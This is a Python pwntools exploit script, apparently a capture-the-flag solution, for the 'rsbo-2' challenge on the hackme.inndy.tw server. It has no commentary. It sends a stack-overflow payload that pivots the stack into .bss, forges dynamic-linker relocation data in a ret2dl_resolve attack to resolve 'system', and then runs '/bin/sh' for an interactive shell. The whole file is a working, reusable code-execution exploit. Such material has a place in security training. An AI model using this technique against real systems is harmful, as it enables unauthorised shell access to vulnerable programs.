from pwn import *
from roputils import *
context.log_level = 'debug'

#p = process('./rsbo-2')
#p = process('./rsbo-2',env = {"LD_PRELOAD":"../libc-2.23.so.i386"})
p = remote('hackme.inndy.tw',7706)
rop = ROP('./rsbo-2')

write_plt = rop.plt('write')
open_plt = rop.plt('open')
read_plt = rop.plt('read')
flag_addr = 0x080487D0
bss_base = rop.section('.bss') + 0x400
bss = bss_base + 0x800
leave_ret = 0x080484f8
pop3_ret = 0x0804879d
offset = 108

payload = '\x00'*104 + p32(bss_base)
payload += p32(read_plt) + p32(leave_ret)
payload += p32(0) + p32(bss_base) + p32(100)
#gdb.attach(p)
p.send(payload)
time.sleep(1)
raw_input("go:")


payload = 'aaaa'
payload += rop.call('read',0,bss,100)
## used to call dl_Resolve()
payload += rop.dl_resolve_call(bss + 20,bss)
#payload += rop.fill(100,payload)
p.sendline(payload)
time.sleep(1)
#raw_input("go:")


payload = rop.string('/bin/sh')
payload += rop.fill(20,payload)
## used to make faking data, such relocation, Symbol, Str
payload += rop.dl_resolve_data(bss + 20, 'system')
payload += rop.fill(100,payload)
p.send(payload)


p.interactive()